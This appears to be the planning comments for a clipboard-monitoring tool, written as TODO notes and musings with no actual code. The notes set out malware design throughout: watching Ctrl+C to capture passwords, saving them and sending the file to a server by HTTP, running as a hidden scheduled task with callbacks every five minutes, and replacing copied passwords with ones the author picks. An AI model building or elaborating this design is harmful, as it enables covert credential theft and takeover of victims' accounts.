# TODO: Organize Code into functions
# TODO: Save Clipboard data to a file, don't overwrite the data maybe?
# TODO: Set up server side and exfil this file somewhere, HTTP request
# TODO: Have the program always run in the background - could have it analyze for passwords,
# listen for ctrl+c and also be a scheduled task
# TODO: Callback every five minutes from server
# TODO: if ctrl+c is used, and a password is obtained, then make a chess puzzle appear, answer must be input
# before allowing to proceed
# TODO: research windows sys calls, pull functionality from it
# TODO: make windows pop ups to say what new password is

#TODO: copy the password when control C is used... could alter the password after ctrl V is used or I could not?
#advantage to leaving it the same is that I would have the password and that would be the password used
#advantage to having it changed is that I could make the password whatever I want
#I think I will change the clip_board data to the chess puzzle idea for fun, and still extract the password info
#although if I change the password it may make the password incorrect and then it will be known there is a tool
#could do solve the chess puzzle to pause the tool?

#if the password is being set then changing it to what we want could be useful...
#having the passwords saved is nice
#changing it to password is kinda fun
